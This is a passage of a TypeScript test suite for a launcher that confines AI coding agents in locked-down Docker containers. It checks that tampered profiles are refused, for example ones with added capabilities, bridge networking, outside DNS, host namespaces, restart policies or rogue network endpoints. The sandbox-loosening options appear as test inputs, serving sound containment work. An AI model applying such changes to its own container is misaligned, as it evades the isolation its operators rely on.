    const result = spawnSync('docker', ['run', '--rm', '--read-only', '--user', '10001:10001', '--cap-drop=ALL',
      '--security-opt=no-new-privileges', '--security-opt=seccomp=unconfined', '--network=none', imageId, 'true'],
      { encoding: 'utf8', timeout: 60_000 });
    expect(result.status).toBe(78);
    expect(result.stderr).toContain('seccomp syscall filter must be enforced');
  }, 60_000);

  it('removes a keeper that lands in the daemon after its run client was killed', async () => {
    const data = fixture();
    const clone = createTaskClone({ source: data.source, parent: join(data.root, 'staging'), taskId: 'task-late',
      head: git(data.source, 'rev-parse', 'HEAD') });
    const keepers = () => new Set(docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.task-storage=keeper')
      .split('\n').filter(Boolean));
    const before = keepers();
    const shim = join(data.root, 'docker-shim'); mkdirSync(shim);
    const realDocker = execFileSync('sh', ['-c', 'command -v docker'], { encoding: 'utf8' }).trim();
    // The keeper's create client hangs until killed, and the real create lands in the daemon afterwards.
    writeFileSync(join(shim, 'docker'), ['#!/bin/sh',
      `if [ "$1" = create ] && [ "$2" = --name ]; then ( sleep 10; exec '${realDocker}' "$@" ) >/dev/null 2>&1 </dev/null & exec sleep 30; fi`,
      `exec '${realDocker}' "$@"`].join('\n'), { mode: 0o755 });
    const path = process.env.PATH;
    process.env.PATH = `${shim}:${path}`;
    try {
      expect(() => prepareTaskFilesystems(clone, {
        workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512,
      // A budget that tolerates a loaded daemon; the keeper still lands after its client is killed at ~8 s.
      }, imageId, testOwner(), 8_000)).toThrow();
    } finally { process.env.PATH = path; }
    execFileSync('sleep', ['3']);
    const orphans = [...keepers()].filter(id => !before.has(id));
    for (const id of orphans) docker('rm', '--force', id);
    expect(orphans).toEqual([]);
  }, 60_000);

  it('rejects a task keeper whose restart policy was changed', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    docker('update', '--restart=always', data.filesystems.keeper);
    try {
      docker(...valid.args); containers.add(valid.name);
      await expect(validateContainer(valid.name, valid)).rejects.toThrow('trusted keeper');
    } finally { docker('update', '--restart=no', data.filesystems.keeper); }
    docker('rm', '--force', valid.name); containers.delete(valid.name);
  }, 60_000);

  it('bounds profile revalidation by the invocation deadline, even with the default budget', async () => {
    const data = fixture(), captured = Date.now(), late = await profile(data, 'planning', 'noop', { deadlineMs: 6_000 });
    execFileSync('sleep', [String(Math.max(0, captured + 6_500 - Date.now()) / 1000)]);
    await expect(assertContainerProfile(late)).rejects.toThrow('deadline has passed');
  }, 60_000);

  it('refuses to launch once the captured invocation deadline has passed', async () => {
    const data = fixture(), captured = Date.now(), late = await profile(data, 'planning', 'noop', { deadlineMs: 6_000 });
    execFileSync('sleep', [String(Math.max(0, captured + 6_500 - Date.now()) / 1000)]);
    await expect(runContainer(late, 60_000)).rejects.toThrow('deadline has passed');
  }, 60_000);

  it('refuses to build a profile once the invocation deadline has passed', async () => {
    const data = fixture(), trusted = await governed(invocation(data.clone, 'planning', 'codex', 5_000));
    const wait = Math.max(0, trusted.invocation.deadline - Date.now() + 500);
    execFileSync('sleep', [String(wait / 1000)]);
    const started = performance.now();
    await expect(createContainerProfile({ ...trusted, filesystems: data.filesystems, inputDirectory: data.input,
      codexAuthFile: data.fakeAuth, imageId })).rejects.toThrow('deadline has passed');
    expect(performance.now() - started).toBeLessThan(2_000);
  }, 60_000);

  it('refuses an invocation copied from a captured request with a different phase', async () => {
    const data = fixture(), trusted = await governed(invocation(data.clone, 'review'));
    const forged = { ...trusted.invocation, phase: 'execute' as Phase };
    await expect(createContainerProfile({ ...trusted, invocation: forged, filesystems: data.filesystems,
      inputDirectory: data.input, codexAuthFile: data.fakeAuth, imageId })).rejects.toThrow('captured');
  }, 60_000);

  it('removes the claimed vendor network when profile creation fails after the claim', async () => {
    const data = fixture();
    await expect(profile(data, 'planning', 'noop', { codexAuthFile: join(data.root, 'missing-auth.json') })).rejects.toThrow();
    const orphan = vendorNetworks.at(-1)!;
    expect(spawnSync('docker', ['network', 'inspect', orphan.name], { stdio: 'ignore' }).status).not.toBe(0);
    expect(spawnSync('docker', ['container', 'inspect', orphan.proxyContainer], { stdio: 'ignore' }).status).not.toBe(0);
  }, 60_000);

  it('does not let a copied profile start or remove the original container', async () => {
    const data = fixture(), live = await profile(data, 'planning', 'noop');
    expect(await createValidatedContainer(live)).toBe(live.name); containers.add(live.name);
    const copy = Object.freeze({ ...live });
    await expect(startValidatedContainer(copy)).rejects.toThrow('trusted profile builder');
    await expect(runContainer(copy)).rejects.toThrow('trusted profile builder');
    expect(spawnSync('docker', ['container', 'inspect', live.name], { stdio: 'ignore' }).status).toBe(0);
    docker('rm', '--force', live.name); containers.delete(live.name);
  }, 60_000);

  it('refuses a Codex auth path that is a link without resolving it', async () => {
    const data = fixture(), link = join(data.root, 'auth-link.json');
    symlinkSync(data.fakeAuth, link);
    await expect(profile(data, 'planning', 'noop', { codexAuthFile: link })).rejects.toThrow('not a link');
  }, 60_000);

  it('rejects an alternate Docker runtime that may not honour the checked isolation', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    docker(...valid.args.map(arg => arg === '--runtime=runc' ? '--runtime=io.containerd.runc.v2' : arg));
    containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);
  }, 60_000);

  it('rejects a restart policy that could relaunch the agent after it exits', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    const imageIndex = valid.args.indexOf(imageId);
    docker(...valid.args.slice(0, imageIndex), '--restart=always', ...valid.args.slice(imageIndex));
    containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);
  }, 60_000);

  it('rejects added capabilities and conflicting or duplicate filesystem options', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    const imageIndex = valid.args.indexOf(imageId);
    const args = [...valid.args.slice(0, imageIndex), '--cap-add=SYS_ADMIN', ...valid.args.slice(imageIndex)];
    docker(...args); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    const state = JSON.parse(docker('container', 'inspect', valid.name))[0] as { State: { Status: string } };
    expect(state.State.Status).toBe('created');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    const expected = ['size=1024', 'nr_inodes=16', 'uid=10001', 'gid=10001', 'mode=0755', 'nosuid', 'nodev'];
    expect(hasExactOptions(expected.join(','), expected)).toBe(true);
    expect(hasExactOptions([...expected, 'size=2048'].join(','), expected)).toBe(false);
    expect(hasExactOptions([...expected, 'dev'].join(','), expected)).toBe(false);
    expect(hasExactOptions([...expected, 'nosuid'].join(','), expected)).toBe(false);
  }, 60_000);

  it('rejects an unauthorized network before the container can start', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    const args = valid.args.map(value => value.startsWith('--network=') ? '--network=bridge' : value);
    docker(...args); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    const state = JSON.parse(docker('container', 'inspect', valid.name))[0] as { State: { Status: string } };
    expect(state.State.Status).toBe('created');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    const dnsArgs = valid.args.map(value => value === '--dns=127.0.0.1' ? '--dns=8.8.8.8' : value);
    docker(...dnsArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('DNS configuration');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    for (const extra of [['--add-host=api.openai.com:127.0.0.1'], ['--publish=127.0.0.1::3128']]) {
      const changedArgs = [...valid.args.slice(0, valid.args.indexOf(imageId)), ...extra,
        ...valid.args.slice(valid.args.indexOf(imageId))];
      docker(...changedArgs); containers.add(valid.name);
      await expect(validateContainer(valid.name, valid)).rejects.toThrow('host or port configuration');
      docker('rm', '--force', valid.name); containers.delete(valid.name);
    }

    const imageIndex = valid.args.indexOf(imageId);
    const namespaceArgs = [...valid.args.slice(0, imageIndex), '--uts=host', ...valid.args.slice(imageIndex)];
    docker(...namespaceArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);

    const resourceArgs = [...valid.args.slice(0, imageIndex), '--memory-swap=-1', ...valid.args.slice(imageIndex)];
    docker(...resourceArgs); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);
  }, 60_000);

  it('rejects a new endpoint attached to the invocation network before launch', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'must-not-run');
    const rogue = `codeboost-rogue-${randomUUID()}`;
    try {
      docker('run', '--detach', '--name', rogue, `--network=${valid.network.name}`, '--entrypoint', 'node', imageId,
        '-e', 'setInterval(()=>{},1000)');
      await expect(createValidatedContainer(valid)).rejects.toThrow('cleanup did not settle');
      const absent = spawnSync('docker', ['container', 'inspect', valid.name], { encoding: 'utf8' });
      expect(absent.status).not.toBe(0);
    } finally {
      spawnSync('docker', ['rm', '--force', rogue], { stdio: 'ignore' });
      await disposeContainerProfile(valid);
    }
  }, 60_000);

  it('revalidates the agent attachment immediately before start', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'must-not-run');
    await createValidatedContainer(valid); containers.add(valid.name);
    docker('network', 'disconnect', valid.network.name, valid.name);
    docker('network', 'connect', 'bridge', valid.name);
    await expect(startValidatedContainer(valid)).rejects.toThrow(/network attachment|lockdown/);
    containers.delete(valid.name);
    expect(spawnSync('docker', ['container', 'inspect', valid.name]).status).not.toBe(0);
  }, 60_000);

  it('creates containers from the captured immutable image rather than its mutable tag', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    expect(valid.expectedImage).toBe(imageId);
    expect(valid.args).toContain(imageId);
    expect(valid.args).not.toContain(AGENT_IMAGE);
    const untrustedDigest = `sha256:${'0'.repeat(64)}`;
    expect(() => assertBuiltAgentImage(untrustedDigest)).toThrow('trusted validated builder');
    expect(() => prepareTaskFilesystems(data.clone, {
      workBytes: 1024, workInodes: 16, metadataBytes: 1024, metadataInodes: 16,
    }, untrustedDigest, testOwner())).toThrow('trusted validated builder');
    expect(() => prepareTaskFilesystems(data.clone, {
      workBytes: 1024, workInodes: 16, metadataBytes: 1024, metadataInodes: 16,
    }, AGENT_IMAGE, testOwner())).toThrow('immutable built image ID');
    expect(() => prepareTaskFilesystems({ ...data.clone }, {
      workBytes: 1024, workInodes: 16, metadataBytes: 1024, metadataInodes: 16,
    }, imageId, testOwner())).toThrow('trusted clone builder');
  }, 60_000);

  if (process.env.CODEBOOST_RUN_AUTH_PROBES === '1') {
    it('runs the authenticated Codex startup path with isolated writable state', async () => {
      const data = fixture(), authFile = process.env.CODEBOOST_CODEX_AUTH_FILE;
      if (!authFile) throw new Error('CODEBOOST_CODEX_AUTH_FILE is required.');
      const authProfile = await profile(data, 'planning', policy => createCodexCommand(policy,
        'Read /run/codeboost-input/schema.json and reply only with the exact value of its probe field, without quotes or Markdown formatting.'),
      { authProbe: true, codexAuthFile: authFile, deadlineMs: 5 * 60_000 });
      // The production launch path: create, validate, start and remove. Raw stdout can carry more than the final
      // message, so the value must appear as a complete line; the adapter probe checks the exact file channel.
      const output = await runContainer(authProfile, 5 * 60_000);
      expect(output.split(/\r?\n/)).toContain('codeboost-schema-marker');
    }, 6 * 60_000);

    it('runs the authenticated Claude startup path with only its OAuth token', async () => {
      const data = fixture(), token = process.env.CLAUDE_CODE_OAUTH_TOKEN;
      if (!token) throw new Error('CLAUDE_CODE_OAUTH_TOKEN is required.');
      const authProfile = await profile(data, 'planning', policy => createClaudeCommand(policy,
        'Read /run/codeboost-input/schema.json and reply only with the exact value of its probe field, without quotes or Markdown formatting.'),
        { vendor: 'claude', authProbe: true, claudeToken: token, deadlineMs: 5 * 60_000 });
      // The production launch path, with the token passed only as the Claude profile's secret.
      const output = await runContainer(authProfile, 5 * 60_000, { CLAUDE_CODE_OAUTH_TOKEN: token });
      const envelope = JSON.parse(output) as { result?: string; is_error?: boolean };
      expect(envelope.is_error).not.toBe(true);
      expect(envelope.result?.replace(/\r?\n$/, '')).toBe('codeboost-schema-marker');
    }, 6 * 60_000);
  }
});
